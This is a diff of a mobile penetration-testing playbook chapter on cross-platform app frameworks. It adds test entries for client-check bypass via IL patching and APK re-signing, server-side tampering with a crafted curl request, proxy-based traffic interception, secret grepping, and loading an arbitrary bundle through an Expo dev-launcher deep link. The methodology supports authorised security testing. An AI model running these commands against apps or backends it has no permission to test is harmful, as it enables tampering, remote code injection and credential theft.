+  for both halves; an empty `mono_*` trace there is a runtime fact, not a negative.
 
 ### D19-068 · Xamarin / MAUI: patch IL and rebuild the assembly store to prove a client-side check is the only control
 
@@ -2723,7 +2813,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 |---|---|
 | **Severity ceiling** | Medium standalone; High by what the bypass unlocks |
 | **VRT** | `lack_of_binary_hardening.lack_of_jailbreak_detection` (**P5**) if filed as a resilience issue — file the unlocked control instead |
-| **Attacker** | AM-12 own device |
+| **Attacker** | AM-01 for what the server accepts once the client-side check is gone (AM-12 to observe: the patched build runs on the attacker's own device) |
 | **Applies to** | Xamarin.Android and .NET ≤ 8 MAUI (blob layout). For .NET 9 MAUI use the `payload`-section extraction and rebuild path |
 | **Requires** | xamarin, device |
 | **Maps to** | HN Security write-up (`pyxamstore unpack -d apktoolOut/unknown/assemblies/`, dnSpy `IsJailBroken()` -> `return false`, `pyxamstore pack`, `apktool b`, `uber-apk-signer`, and the split-APK `pm install-create/write/commit` install path); pyxamstore README (`assemblies.json` is required for the repack); MASTG-TOOL-0103 |
@@ -2732,15 +2822,15 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   store, re-sign, install. It demonstrates that the gate is client-side and nothing else enforces it.
 - **How:**
   ```bash
-  apktool d target.apk -o out/
-  pyxamstore unpack -d out/unknown/assemblies/
+  # decompiled by P2 into $DEC ($DEC/apktool, $DEC/jadx/sources); $DEC/raw holds the unpacked splits
+  (cd "$DEC/assemblies" && pyxamstore unpack -d "$DEC/apktool/unknown/assemblies/")
   # dnSpy: locate the check (e.g. IsJailBroken()), right-click > Edit Class > body: return false;
   #        > Compile > File > Save Module (overwrite the DLL)
   pyxamstore pack                                  # uses the assemblies.json written during unpack
-  cp assemblies.blob assemblies.manifest out/unknown/assemblies/
-  apktool b out/ -o repacked.apk
+  cp assemblies.blob assemblies.manifest $DEC/apktool/unknown/assemblies/
+  apktool b "$DEC/apktool" -o repacked.apk
   java -jar uber-apk-signer.jar --apks repacked.apk
-  adb install -r repacked-aligned-debugSigned.apk
+  adb -s "$SERIAL" install -r repacked-aligned-debugSigned.apk
   ```
 - **Proof:** The app running normally on a device it previously refused, or the gated feature becoming
   available — captured on screen, then followed by the server-side consequence.
@@ -2767,14 +2857,14 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   `expect/actual` indirection makes it easy to review only the Android half.
 - **How:**
   ```bash
-  jadx -d out target.apk
-  grep -rl "kotlin.Metadata" out/sources | head
-  grep -rn 'expect fun\|actual fun\|actual class\|expect val\|actual val' out/sources 2>/dev/null | head
-  grep -rn "class .*\\\$.*Android\b\|AndroidPlatform\|platform\.Android" out/sources | head
+  # decompiled by P2 into $DEC/jadx/sources
+  grep -rl "kotlin.Metadata" $DEC/jadx/sources | head
+  grep -rn 'expect fun\|actual fun\|actual class\|expect val\|actual val' $DEC/jadx/sources 2>/dev/null | head
+  grep -rn "class .*\\\$.*Android\b\|AndroidPlatform\|platform\.Android" $DEC/jadx/sources | head
   # the usual KMP stack — ktor, SQLDelight, multiplatform-settings, okio:
-  grep -rnE 'io\.ktor|app\.cash\.sqldelight|com\.russhwolf\.settings|okio' out/sources | head
-  grep -rn 'HttpClient(\|install(\|CIO\|OkHttp(' out/sources | head -30
-  grep -rn 'trustManager\|X509TrustManager\|checkServerTrusted' out/sources | head
+  grep -rnE 'io\.ktor|app\.cash\.sqldelight|com\.russhwolf\.settings|okio' $DEC/jadx/sources | head
+  grep -rn 'HttpClient(\|install(\|CIO\|OkHttp(' $DEC/jadx/sources | head -30
+  grep -rn 'trustManager\|X509TrustManager\|checkServerTrusted' $DEC/jadx/sources | head
   ```
 - **Proof:** The vulnerable function located inside a class that is clearly shared — no `android` import,
   referenced from an `actual` binding — and, where you have the iOS artefact, the same logic present there.
@@ -2802,10 +2892,10 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   invisible to a manifest review because the `expect/actual` indirection hides where it came from.
 - **How:**
   ```bash
-  grep -rn 'class BuildConfig' out/sources | head
-  grep -rnoE '(String|val) +[A-Z_]{4,} *= *"[^"]{12,}"' out/sources | head -60
-  grep -rn 'expect val\|actual val' out/sources | grep -iE 'key|secret|token|url' | head
-  grep -rniE 'API_KEY|CLIENT_SECRET|BASE_URL|TOKEN *=|SECRET *=' out/sources --include='*.java' | head -50
+  grep -rn 'class BuildConfig' $DEC/jadx/sources | head
+  grep -rnoE '(String|val) +[A-Z_]{4,} *= *"[^"]{12,}"' $DEC/jadx/sources | head -60
+  grep -rn 'expect val\|actual val' $DEC/jadx/sources | grep -iE 'key|secret|token|url' | head
+  grep -rniE 'API_KEY|CLIENT_SECRET|BASE_URL|TOKEN *=|SECRET *=' $DEC/jadx/sources --include='*.java' | head -50
   ```
 - **Proof:** A live key recovered from the generated constants class and validated against the service per
   D19-012.
@@ -2819,7 +2909,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) where key material is recovered; `broken_access_control.privilege_escalation` (null) where a licence/entitlement decision the server trusts is bypassed |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) where key material is recovered; `broken_access_control.privilege_escalation` (varies) where a licence/entitlement decision the server trusts is bypassed |
 | **Attacker** | AM-01 (offline analysis) / AM-12 (runtime interception) |
 | **Applies to** | Cordova/Ionic/Capacitor WebViews, RN WebViews, Unity WebGL builds embedded in a WebView, and any in-app browser rendering first-party content that loads Wasm |
 | **Requires** | webview |
@@ -2829,8 +2919,8 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   load them from the network. Wasm is not obfuscation — it decompiles, and it can be hooked from JavaScript.
 - **How:**
   ```bash
-  find out/assets -name '*.wasm'
-  grep -rnE 'WebAssembly\.(instantiate|compile|instantiateStreaming|compileStreaming)' out/assets/{www,public} 2>/dev/null | head
+  find $DEC/apktool/assets -name '*.wasm'
+  grep -rnE 'WebAssembly\.(instantiate|compile|instantiateStreaming|compileStreaming)' $DEC/apktool/assets/{www,public} 2>/dev/null | head
   wasm-objdump -x module.wasm | head -60
   wasm2wat module.wasm -o module.wat && grep -nE '\(export|\(import' module.wat | head -40
   wasm-decompile module.wasm -o module.dcmp
@@ -2871,12 +2961,12 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   fetched at runtime and not signed, the server — or an on-path attacker — executes code inside the app.
 - **How:**
   ```bash
-  for so in ext/lib/arm64-v8a/*.so; do
+  for so in $DEC/raw/lib/arm64-v8a/*.so; do
     echo "== $so"
     nm -D "$so" 2>/dev/null | grep -iE 'JS_Eval|JS_NewRuntime|duk_|v8::|JSEvaluateScript|JSGlobalContextCreate'
   done
-  strings ext/lib/arm64-v8a/*.so | grep -aiE 'quickjs|duktape|jerryscript|hermes|jsc |v8 ' | sort -u | head
-  frida-trace -U -f <pkg> -i 'JS_Eval*' -i 'duk_eval*' -i 'JSEvaluateScript*' -i 'duk_peval*'
+  strings $DEC/raw/lib/arm64-v8a/*.so | grep -aiE 'quickjs|duktape|jerryscript|hermes|jsc |v8 ' | sort -u | head
+  frida-trace -D "$SERIAL" -f <pkg> -i 'JS_Eval*' -i 'duk_eval*' -i 'JSEvaluateScript*' -i 'duk_peval*'
   ```
 - **Proof:** A trace showing script text arriving from the network and being evaluated, with the source of
   that text identified as an unauthenticated or unsigned HTTP response — then your own script executing after
@@ -2898,7 +2988,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **Requires** | backend-api |
 | **Maps to** | ATT&CK T1533; the endpoint inventory from D19-011 is the input |
 
-- **Test:** Old API versions stay reachable without receiving the same fixes, and a mobile app's hardcoded
+- **Test:** (Owner of the shadow-API method; D04-064, D09-074, D12-043 and D23-056 restate it for their surfaces — run the method once, here, and record their surface-specific inputs on their own ids.) Old API versions stay reachable without receiving the same fixes, and a mobile app's hardcoded
   backend calls are the number-one source of old-version endpoints — "a mobile app whose hardcoded backend
   calls look older than the current web app's". **The bug is the delta**, not the existence of the old
   version.
@@ -2932,7 +3022,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.privilege_escalation` (null) or `broken_authentication_and_session_management.authentication_bypass` (P1) for the auth cases; `broken_authentication_and_session_management.two_fa_bypass` (P3) for the MFA case |
+| **VRT** | `broken_access_control.privilege_escalation` (varies) or `broken_authentication_and_session_management.authentication_bypass` (P1) for the auth cases; `broken_authentication_and_session_management.two_fa_bypass` (P3) for the MFA case |
 | **Attacker** | AM-01 |
 | **Applies to** | all frameworks; most acute in RN/Flutter/KMP, where "write the logic once and share it" is the selling point |
 | **Requires** | backend-api |
@@ -2943,10 +3033,11 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   attempt counters, MFA decisions — and try each one directly against the API.
 - **How:**
   ```bash
-  hermes-decomp decompile ext/assets/index.android.bundle -o out/ --deep
-  grep -rnE 'if *\(.*(role|isAdmin|canEdit|amount|limit|maxQty|status) *[=!<>]' out/ | head -50
-  grep -nE 'isAdmin|role|entitlement|canPurchase|maxAmount|attempts|retryCount|lockout' out_dir/asm/*.txt out/dump.cs 2>/dev/null | head -50
-  grep -a -nE '"(amount|price|total|discount|couponValue|finalPrice)"' hbc.strings out_dir/pp.txt | head -40
+  hermes-decomp decompile $DEC/raw/assets/index.android.bundle -o "$DEC/hermes/" --deep
+  grep -rnE 'if *\(.*(role|isAdmin|canEdit|amount|limit|maxQty|status) *[=!<>]' "$DEC/hermes/" | head -50
+  grep -nE 'isAdmin|role|entitlement|canPurchase|maxAmount|attempts|retryCount|lockout' $DEC/blutter/asm/*.txt "$DEC/il2cpp/dump.cs" 2>/dev/null | head -50
+  grep -axE '(amount|price|total|discount|couponValue|finalPrice)' strings.txt | head -40      # Hermes: raw strings, no quotes (D19-009)
+  grep -a -nE '"(amount|price|total|discount|couponValue|finalPrice)"' hbc.strings $DEC/blutter/pp.txt 2>/dev/null | head -40   # plain Metro bundle / Dart pool
   # then issue the request directly, bypassing the client entirely:
   curl -s -X POST https://api.target/orders -H "Authorization: Bearer $T" \
     -H 'Content-Type: application/json' -d '{"qty":99999,"price":0,"role":"admin"}' -i
@@ -2986,7 +3077,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (null — rated on what travels) |
+| **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (varies — rated on what travels) |
 | **Attacker** | AM-06 network attacker, no trusted CA required |
 | **Applies to** | Flutter, Unity, React Native, Cordova/Capacitor — any framework with a non-platform HTTP stack |
 | **Requires** | mitm, flutter, unity, react-native, cordova, capacitor |
@@ -2998,17 +3089,20 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   with no official method, so the commands below are the practical equivalent.
 - **How:**
   ```bash
-  grep -n 'networkSecurityConfig\|usesCleartextTraffic' out/AndroidManifest.xml
-  cat out/res/xml/network_security_config.xml
+  grep -n 'networkSecurityConfig\|usesCleartextTraffic' $DEC/apktool/AndroidManifest.xml
+  cat $DEC/apktool/res/xml/network_security_config.xml
   # React Native
   grep -a -nE "http://|useDeveloperSupport|__DEV__|localhost:8081" hbc.strings
   # Cordova / Capacitor
-  grep -nE "<allow-navigation|<access origin|Content-Security-Policy|cleartext" out/res/xml/config.xml
-  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(d.get('server',{}))" | grep -i cleartext
+  grep -nE "<allow-navigation|<access origin|Content-Security-Policy|cleartext" $DEC/apktool/res/xml/config.xml
+  python3 -c "import json;d=json.load(open('$DEC/apktool/assets/capacitor.config.json'));print(d.get('server',{}))" | grep -i cleartext
   # Flutter
-  grep -rn "badCertificateCallback\|HttpOverrides" out_dir/asm/ 2>/dev/null
+  grep -rn "badCertificateCallback\|HttpOverrides" $DEC/blutter/asm/ 2>/dev/null
+  # Unity (UnityWebRequest bypasses the NSC; a CertificateHandler whose ValidateCertificate returns true disables validation entirely)
+  grep -nE ': *CertificateHandler|ValidateCertificate\(|certificateHandler *=|AcceptAllCertificates|ServicePointManager\.ServerCertificateValidationCallback' "$DEC/il2cpp/dump.cs" | head
+  grep -aoE 'http://[A-Za-z0-9._:/-]+' "$DEC/il2cpp/dump.cs" | sort -u | head         # cleartext rows the NSC never sees
   # empirically — the only conclusive test
-  adb shell settings put global http_proxy <host>:8080
+  adb -s "$SERIAL" shell settings put global http_proxy <host>:8080
   tcpdump -i any -n 'tcp port 80'      # on the test AP/host
   ```
   The developer-side shape worth recognising in Dart source or reconstructed assembly:
@@ -3028,8 +3122,9 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **Escalation:** -> D14; cleartext or permissive navigation in a Cordova WebView -> D10 injection into the
   app origin -> the bridge chains.
 - **Ruled out when:** A full-walkthrough packet capture shows no plaintext HTTP from the app's UID, every
-  framework config key is TLS-only, and no `badCertificateCallback`/`HttpOverrides` appears in the
-  reconstructed Dart. Remember the API gate: cleartext default-allow applies at `targetSdk<28` (**LEGACY**),
+  framework config key is TLS-only, no `badCertificateCallback`/`HttpOverrides` appears in the
+  reconstructed Dart, no `CertificateHandler` subclass in `dump.cs` returns a constant `true` (read the body,
+  obfuscated names aside), and the Unity traffic appears in the capture only as TLS to first-party hosts. Remember the API gate: cleartext default-allow applies at `targetSdk<28` (**LEGACY**),
   and at `targetSdk>=28` the platform stack denies it — but only the platform stack.
 
 ### D19-076 · Framework verbose logging carrying bridge payloads
@@ -3037,7 +3132,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); Critical only when the logged value is authentication material and a local reader exists |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); Critical only when the logged value is authentication material and a local reader exists |
 | **Attacker** | AM-04 local app with a common permission (`READ_LOGS` where granted), AM-11 physical unlocked, or anyone receiving a bug report |
 | **Applies to** | Capacitor and Cordova primarily; the RN/Flutter equivalents are `console.log`/`debugPrint` left in |
 | **Requires** | device |
@@ -3048,14 +3143,16 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   in logcat.
 - **How:**
   ```bash
-  python3 -c "import json;print(json.load(open('out/assets/capacitor.config.json')).get('loggingBehavior'))"
-  python3 -c "import json;print(json.load(open('out/assets/capacitor.config.json')).get('android',{}).get('loggingEnabled'))"
-  adb logcat -c
-  # exercise login and a data-heavy flow, then:
-  adb logcat -d | grep -iE 'To native \(|Plugin|Capacitor|Cordova|ReactNative|flutter' | head -80
-  adb logcat -d | grep -aiE 'token|bearer|password|authorization|"pan"|otp|ssn'
+  python3 -c "import json;print(json.load(open('$DEC/apktool/assets/capacitor.config.json')).get('loggingBehavior'))"
+  python3 -c "import json;print(json.load(open('$DEC/apktool/assets/capacitor.config.json')).get('android',{}).get('loggingEnabled'))"
+  adb -s "$SERIAL" logcat -G 32M && adb -s "$SERIAL" logcat -c
+  adb -s "$SERIAL" shell log -t D19ctl "positive-control $(date +%s)"      # must appear in the saved dump, or the buffer rotated
+  # exercise login and a data-heavy flow, then save ONE dump and grep the file (not a second live read):
+  adb -s "$SERIAL" logcat -d > "$E/logs/D19-076-logcat.txt"; grep -c D19ctl "$E/logs/D19-076-logcat.txt"
+  grep -iE 'To native \(|Plugin|Capacitor|Cordova|ReactNative|flutter' "$E/logs/D19-076-logcat.txt" | head -80
+  grep -aiE 'token|bearer|password|authorization|"pan"|otp|ssn' "$E/logs/D19-076-logcat.txt"
   # what the JS/Dart layer ships to crash reporters:
-  grep -aiE 'sentry|bugsnag|crashlytics|instabug|datadog' hbc.strings out_dir/pp.txt | sort -u | head
+  grep -aiE 'sentry|bugsnag|crashlytics|instabug|datadog' hbc.strings $DEC/blutter/pp.txt | sort -u | head
   grep -a -nE 'beforeSend|setExtra|setContext|setUser|attachStacktrace|addBreadcrumb' hbc.strings | head
   ```
 - **Proof:** A logcat line containing a real credential, token or PII value from a **release** build, with the
@@ -3063,8 +3160,9 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   tokens or message content.
 - **Escalation:** -> D20 privacy and logging; a logged session token -> D15 replay.
 - **Ruled out when:** `loggingBehavior` is `none` or `production`, a full authenticated walkthrough produces
-  no sensitive value in `adb logcat -d`, and the crash reporter's `beforeSend` scrubs the payload (verify by
-  forcing an exception and reading the outbound request). Empty logging is not a finding — do not report the
+  no sensitive value in the saved dump **and** the `D19ctl positive-control` line is present in that same dump
+  (a dump without it is a rotated buffer, not a clean app), and the crash reporter's `beforeSend` scrubs the
+  payload (verify by forcing an exception and reading the outbound request). Empty logging is not a finding — do not report the
   configuration alone.
 
 ### D19-077 · False-positive discipline for framework-recovered endpoints, strings and behaviours
@@ -3106,6 +3204,12 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
   - **Adjacency is not a call site.** The Hermes string table is sorted and deduplicated, so two strings
     appearing next to each other does not mean they are used together. Mark any adjacency-based claim as
     unproven.
+  - **Device-shell quoting.** `adb shell "…"` is re-parsed by the device `sh`: `<`, `>`, `&&`, `?`, `&`, `#` and `*`
+    become redirections, operators and globs, and the command silently does nothing. Single-quote the remote
+    command, %-encode URI payloads, and echo the delivered intent back from `dumpsys activity top` before reading
+    a negative.
+  - **Positive controls for tools.** A zero from gitleaks, apkleaks, a logcat grep or a Frida hook counts only
+    next to a passed control in the same run (a planted key, the `D19ctl` log line, the `[+] hooked` line).
 - **Proof:** A negative-control artefact for each claim: the baseline lacking the marker, the byte-level diff,
   the distribution table, the result counts.
 - **Escalation:** n/a — this is the gate before filing.
@@ -3119,7 +3223,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **VRT** | n/a (triage control) |
 | **Attacker** | n/a |
 | **Applies to** | every finding in this chapter |
-| **Requires** | backend-api |
+| **Requires** | — |
 | **Maps to** | MASTG-TOOL-0104 (the `file`-based engine identification MASTG itself prescribes), MASTG-TECH-0165 |
 
 - **Test:** A cross-platform finding is not reproducible without the runtime, the bundle/snapshot identity and
@@ -3160,7 +3264,7 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 | **VRT** | n/a (submission control) |
 | **Attacker** | n/a |
 | **Applies to** | any D19 finding that is a chain — which most of the P1s in this chapter are |
-| **Requires** | backend-api |
+| **Requires** | — |
 | **Maps to** | n/a (method; drawn from the bug-hunting corpus's reporting register) |
 
 - **Test:** The high-value outcomes here are chains: *bundle-recovered endpoint* + *shadow-API auth
@@ -3185,6 +3289,181 @@ A probe with an unlisted split (`pm path` count ≠ files in `$E/apk/`) or an `a
 - **Escalation:** n/a.
 - **Ruled out when:** The finding genuinely has one fix surface — for example an unsigned OTA channel, which
   is a single configuration change. File that as one report.
+
+### D19-080 · Compiled-in backend environment table and the selector that chooses the row
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical when the selector is attacker-reachable and the non-production row is cleartext or attacker-resolvable; Support otherwise |
+| **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (varies) for a cleartext row that carries the bearer; `server_side_injection.remote_code_execution_rce` (P1) when the selected row also serves code (D19-048, D19-030) |
+| **Attacker** | AM-03 zero-permission local app (an exported preference screen, receiver or deep link sets the row); AM-02 for a deep-link selector; AM-06 for a cleartext row that is selected by default on some build |
+| **Applies to** | all frameworks and native builds alike — Flutter `--dart-define`/flavors, RN `react-native-config`/`EXPO_PUBLIC_*`, Capacitor `server.url`, Unity/MAUI config classes, native `BuildConfig`/enum tables |
+| **Requires** | backend-api |
+| **Maps to** | MASWE-0026 (cleartext row), MASWE-0035 (a row that feeds a WebView); CWE-15 (external control of system or configuration setting) |
+| **Record** | logs/D19-080.txt (the table, the selector call sites, the attempted writes with before/after diffs); requests/E-NNN.http for the redirected request |
+
+- **Skip when:** `grep -rnoE 'https?://(localhost|127\.0\.0\.1|10\.0\.2\.2|[a-z0-9.-]*(staging|dev|qa|sandbox|internal)[a-z0-9.-]*)(:[0-9]+)?' "$DEC/jadx/sources" "$DEC/blutter/pp.txt" strings.txt 2>/dev/null | wc -l` is 0 **and** `grep -rnE 'enum .*(Env|Environment|Flavor|Stage)|BuildConfig\.(FLAVOR|BUILD_TYPE)' "$DEC/jadx/sources" | wc -l` is 0 → note `D19-080 n/a: single compiled-in backend host, no environment table`.
+- **Test:** Cross-platform and native builds alike ship a table of backend environments; the production row is one
+  of several, and a selector — build flavor, remote-config flag, debug preference, deep-link or intent extra, an
+  exported settings screen — picks it at runtime. The finding is a selector reachable by a weaker attacker than
+  the build system, pointing an authenticated client at a cleartext or attacker-resolvable host. A `localhost` or
+  staging row found in the DEX is not the finding; it is the input.
+- **How:**
+  ```bash
+  grep -rnoE 'https?://(localhost|127\.0\.0\.1|10\.0\.2\.2|[a-z0-9.-]*(staging|dev|qa|sandbox|internal)[a-z0-9.-]*)(:[0-9]+)?[^"]*' "$DEC/jadx/sources" "$DEC/blutter/pp.txt" strings.txt 2>/dev/null | sort -u
+  grep -rnE 'enum .*(Env|Environment|Flavor|Stage)|BuildConfig\.(FLAVOR|BUILD_TYPE)|\.getString\("(env|environment|base_url|server)' "$DEC/jadx/sources" | head -30
+  # who writes the selector? trace each source: SharedPreferences key, remote-config flag, intent extra, deep-link query, exported activity
+  grep -rnE 'putString\("(env|environment|base_url|server)|getStringExtra\("(env|environment|base_url)|getQueryParameter\("(env|environment|base_url)' "$DEC/jadx/sources" | head
+  # drive the weakest writer you found from the probe app, not from adb (R3):
+  #   deep link: <scheme>://settings?env=local     intent extra: --es env local     exported preference screen: tap it
+  adb -s "$SERIAL" shell 'run-as <pkg> cat shared_prefs/*.xml' | grep -iE 'env|base_url|server'      # su -c on the rooted AVD for a release build
+  ```
+- **Proof:** The app issuing an authenticated request (bearer visible in the capture) to the non-production row
+  after a selector write performed from the attacker model you claim, with the write path quoted `file:line`; for
+  a cleartext row, the plaintext request on the wire.
+- **Escalation:** Selector + cleartext row -> D14 bearer capture -> D15 replay; selector + a row that serves app
+  code (Capacitor `server.url`, the RN packager host) -> D19-048 / D19-017 RCE; a remote-config-only selector
+  -> D18 (who can write the flag).
+- **Ruled out when:** Every selector source is a compile-time constant or a remote-config value the vendor controls
+  (name the flag and show its default), the non-production rows are TLS-only on vendor-owned hosts, and a
+  deep-link/extra write attempt from the probe app leaves `shared_prefs`/DataStore unchanged (diff before/after).
+  Record the table and the selector chain even on a negative.
+
+### D19-081 · Flutter code push (Shorebird) with no patch-signing key — the Dart analogue of an unsigned OTA channel
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); baseline `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) |
+| **Attacker** | AM-09 malicious backend/CDN; AM-06 where TLS to the patch host is the only control |
+| **Applies to** | Flutter release builds produced with the Shorebird toolchain (a patched `libflutter.so` with an updater, plus `flutter_assets/shorebird.yaml`) |
+| **Requires** | flutter |
+| **Maps to** | MASWE-0049 (CWE-494); MASTG-TECH-0156; ATT&CK T1407 |
+| **Record** | logs/D19-081.txt (shorebird.yaml, updater strings, on-device patch directory listing); the D19-031 before/after hash pair |
+
+- **Skip when:** `grep -c 'flutter_assets/shorebird\.yaml' "$E/logs/D19-001-apklist.txt"` is 0 **and** `strings "$DEC/raw/lib/arm64-v8a/libflutter.so" | grep -ciE 'shorebird|updater'` is 0 → note `D19-081 n/a: no Shorebird markers (shorebird.yaml absent, engine has no updater strings)`.
+- **Test:** Shorebird replaces the Flutter engine with one that downloads and applies Dart-code patches at launch.
+  Patches are verified only when the app ships a patch-signing public key; without it, whoever answers the patch
+  check-in (or sits on the path) ships Dart code to every install — the same shape as D19-026/D19-027 for a
+  framework the OTA block otherwise rules out.
+- **How:**
+  ```bash
+  unzip -p "$E"/apk/base.apk assets/flutter_assets/shorebird.yaml           # app_id, base_url (self-hosted?), auto_update, patch_public_key
+  strings "$DEC/raw/lib/arm64-v8a/libflutter.so" | grep -iE 'shorebird|/api/v1/patches|check_for_update|patch_public_key' | sort -u | head
+  adb -s "$SERIAL" shell 'run-as <pkg> ls -laR files/shorebird_updater/ 2>/dev/null; run-as <pkg> ls -la code_cache/ 2>/dev/null'   # downloaded patch artefacts + updater state
+  adb -s "$SERIAL" logcat -d | grep -iE 'shorebird|updater' | head
+  # demonstrate as in D19-026: answer the patch check-in from a host you control (mitmproxy rewrite of base_url), restart, then run the D19-031 capture
+  ```
+- **Proof:** `shorebird.yaml` with no `patch_public_key` (or an updater that applies a patch whose signature does
+  not verify), plus your patch executing after a restart with unchanged `versionCode`/`lastUpdateTime` (D19-031).
+- **Escalation:** Same impact set as D19-026: code in the app UID, every MethodChannel (D19-040), every stored
+  credential (D11). A self-hosted `base_url` -> D18 (who controls the host) and D19-080 (environment selector).
+- **Ruled out when:** `patch_public_key` is present and a patch you serve with a bad signature is rejected (logcat
+  shows the verification failure and the app boots the embedded snapshot), or `auto_update: false` with no in-app
+  update call reachable. A Shorebird build with signing in force is a Support observation only.
+
+### D19-082 · expo-dev-launcher / expo-dev-client shipped in a store build — the `url=` deep link loads an arbitrary bundle
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (varies) when the launcher UI is reachable but the URL load is gated |
+| **Attacker** | AM-02 remote one-click (the `exp+<slug>` scheme is BROWSABLE); AM-03 zero-permission local app (explicit Intent to the launcher activity) |
+| **Applies to** | Expo / expo-updates apps built with `expo-dev-client`; D19-017 covers the bare-RN packager wiring, whose class names are absent here |
+| **Requires** | react-native, deeplink |
+| **Maps to** | MASWE-0049 (CWE-494); MASTG-TECH-0172; ATT&CK T1407 |
+| **Record** | logs/D19-082.txt (manifest excerpt, `expo.modules.devlauncher` strings, the launch and the bundle request on the wire) |
+
+- **Skip when:** `grep -cE 'expo\.modules\.devlauncher|expo-development-client|DevLauncherActivity' "$DEC/apktool/AndroidManifest.xml" strings.txt` is 0 for both files → note `D19-082 n/a: no expo-dev-launcher classes or scheme in the release build`.
+- **Test:** The dev launcher is an in-app screen plus a deep link that accepts a bundle URL and loads it with full
+  native-module access. It is meant for development builds; shipping it is RCE-by-link, and an app that passes
+  D19-017 (no `DevSupportManager`) can still ship it.
+- **How:**
+  ```bash
+  grep -nB3 -A12 'devlauncher\|DevLauncher' "$DEC/apktool/AndroidManifest.xml"          # activity + intent-filter (scheme exp+<slug>, BROWSABLE?)
+  grep -a -nE 'expo-development-client|expo\.modules\.devlauncher|DevLauncherController|loadApp\(' strings.txt | head
+  adb -s "$SERIAL" shell 'am start -a android.intent.action.VIEW -d "exp+<slug>://expo-development-client/?url=http%3A%2F%2F<your-host>%3A8081" <pkg>'   # shell demo; the AM-02 proof is the same link from a browser page
+  tcpdump -i any -n 'tcp port 8081'   # your host receives /index.bundle?platform=android from the device
+  ```
+- **Proof:** The launcher opening in a store-signed build (`apksigner verify --print-certs`) and your host receiving
+  the bundle request after a link click, then your bundle's marker in logcat — with the D19-031 identity pair.
+- **Escalation:** Full client takeover as in D19-026 (-> D19-018 modules, D11 storage, D13 sessions); pair with
+  D19-028 when the same launcher also overrides the updates URL.
+- **Ruled out when:** No `devlauncher` classes in the DEX (`grep -rl 'expo.modules.devlauncher' "$DEC/jadx/sources"`
+  is empty) and no `exp+` scheme in the merged manifest; or the activity exists but is `exported="false"` with no
+  BROWSABLE filter **and** a `url=` load from the probe app is refused (show the refusal).
+
+### D19-083 · Flutter WebView JavaScript channels and handlers reachable from any loaded origin
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when a channel hands back or acts on the session; otherwise rated on the Dart handler's capability |
+| **Attacker** | AM-02 remote one-click (a route or URL parameter that loads attacker content into the WebView) |
+| **Applies to** | Flutter apps using `webview_flutter` (`addJavaScriptChannel`) or `flutter_inappwebview` (`addJavaScriptHandler`, `window.flutter_inappwebview.callHandler`); D19-033 harvests the channel names, D19-040 covers MethodChannels, D19-022 the RN equivalent |
+| **Requires** | flutter, webview, js-bridge |
+| **Maps to** | MASWE-0033, MASWE-0035, MASTG-TEST-0334 |
+| **Record** | logs/D19-083.txt (channel names, the Dart handler location in `asm/`, the off-origin call and its result) |
+
+- **Skip when:** `grep -caE 'JavaScriptChannel|addJavaScriptChannel|addJavaScriptHandler|flutter_inappwebview|webview_flutter' "$DEC/blutter/pp.txt"` is 0 → note `D19-083 n/a: no Flutter WebView plugin in the snapshot`.
+- **Test:** `webview_flutter` turns each `JavaScriptChannel(name)` into `addJavascriptInterface(<name>)`;
+  `flutter_inappwebview` exposes every `addJavaScriptHandler` name through
+  `window.flutter_inappwebview.callHandler(name, …)`. Neither plugin checks the calling origin — the Dart handler
+  is the only authorisation — so the questions are which origins the WebView can reach and what each handler does
+  with the message. D10's Java greps miss these because the registration lives in the plugin, not the app.
+- **How:**
+  ```bash
+  grep -aoE 'JavaScriptChannel|addJavaScriptHandler|callHandler|handlerName|postMessage' "$DEC/blutter/pp.txt" | sort | uniq -c
